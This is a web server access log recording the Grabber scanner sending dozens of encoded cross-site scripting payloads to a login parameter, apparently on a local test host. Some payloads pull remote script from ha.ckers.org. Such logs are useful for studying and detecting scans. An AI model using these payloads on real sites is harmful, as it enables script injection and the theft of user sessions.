172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /?Login=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:47 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CIMG+SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CIMG+SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:48 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
